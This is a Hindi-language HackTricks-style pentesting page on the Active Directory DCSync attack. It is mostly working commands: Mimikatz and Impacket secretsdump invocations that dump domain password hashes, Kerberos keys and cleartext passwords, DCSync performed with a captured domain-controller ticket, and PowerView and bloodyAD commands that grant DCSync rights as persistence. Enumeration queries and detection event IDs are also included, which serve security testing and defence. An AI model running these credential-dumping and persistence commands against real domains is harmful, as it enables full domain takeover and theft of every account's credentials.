# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** permission का अर्थ है कि domain पर ये permissions प्राप्त हैं: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।<sup>[[3]](#references)</sup>

**DCSync के बारे में महत्वपूर्ण नोट्स:**

- **DCSync attack, Domain Controller के behavior को simulate करता है और Directory Replication Service Remote Protocol (MS-DRSR) का उपयोग करके अन्य Domain Controllers से information replicate करने के लिए कहता है।** चूंकि MS-DRSR, Active Directory का एक valid और आवश्यक function है, इसलिए इसे turn off या disable नहीं किया जा सकता।
- By default, केवल **Domain Admins, Enterprise Admins, Administrators, और Domain Controllers** groups के पास आवश्यक privileges होते हैं।
- व्यवहार में, **full DCSync** के लिए domain naming context पर **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** आवश्यक हैं। `DS-Replication-Get-Changes-In-Filtered-Set` को आमतौर पर इनके साथ delegate किया जाता है, लेकिन अपने आप में यह full krbtgt dump की तुलना में **confidential / RODC-filtered attributes** (उदाहरण के लिए legacy LAPS-style secrets) को sync करने के लिए अधिक relevant है।<sup>[[2]](#references)</sup>
- यदि किसी account के passwords reversible encryption के साथ stored हैं, तो Mimikatz में password को clear text में return करने का option उपलब्ध है।

### Enumeration

`powerview` का उपयोग करके check करें कि इन permissions के पास किसके पास हैं:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
यदि आप DCSync rights वाले **non-default principals** पर ध्यान केंद्रित करना चाहते हैं, तो built-in replication-capable groups को फ़िल्टर करके हटाएँ और केवल unexpected trustees की समीक्षा करें:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### स्थानीय रूप से Exploit करें
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ रूप से Exploit करें
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
व्यावहारिक scope वाले उदाहरण:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### captured DC machine TGT (ccache) का उपयोग करके DCSync

unconstrained-delegation export-mode scenarios में, आप Domain Controller machine TGT (जैसे, `DC1$@DOMAIN` for `krbtgt@DOMAIN`) capture कर सकते हैं। इसके बाद आप उस ccache का उपयोग करके DC के रूप में authenticate कर सकते हैं और password के बिना DCSync perform कर सकते हैं।<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path** DRSUAPI call से पहले SMB को touch करता है। यदि environment **SPN target name validation** लागू करता है, तो पूरा dump विफल हो सकता है: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- ऐसी स्थिति में, पहले target DC के लिए **`cifs/<dc>`** service ticket request करें या तुरंत आवश्यक account के लिए **`-just-dc-user`** का उपयोग करें।
- जब आपके पास केवल lower replication rights हों, तब भी LDAP/DirSync-style syncing **confidential** या **RODC-filtered** attributes (उदाहरण के लिए legacy `ms-Mcs-AdmPwd`) expose कर सकता है, बिना full krbtgt replication के।<sup>[[2]](#references)</sup>

`-just-dc` 3 files generate करता है:

- एक में **NTLM hashes**
- एक में **Kerberos keys**
- एक में NTDS से उन सभी accounts के cleartext passwords होते हैं जिनके लिए [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled है। आप reversible encryption वाले users को इस command से प्राप्त कर सकते हैं:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

यदि आप domain admin हैं, तो `powerview` की सहायता से किसी भी user को ये permissions grant कर सकते हैं:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operators `bloodyAD` के साथ भी ऐसा कर सकते हैं:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
फिर, आप **जाँच सकते हैं कि user को 3 privileges सही ढंग से assign किए गए थे**—इसके लिए उन्हें निम्नलिखित के output में खोजें (आपको "ObjectType" field में privileges के नाम दिखाई देने चाहिए):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### शमन

- Security Event ID 4662 (Audit Policy for object must be enabled) – किसी object पर operation किया गया<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – किसी directory service object को modified किया गया
- Security Event ID 4670 (Audit Policy for object must be enabled) – किसी object पर permissions बदली गईं
- AD ACL Scanner - ACLs की reports create और compare करें। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## संदर्भ

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Leveraging Replication Get-Changes and Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Dump Password Hashes from Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
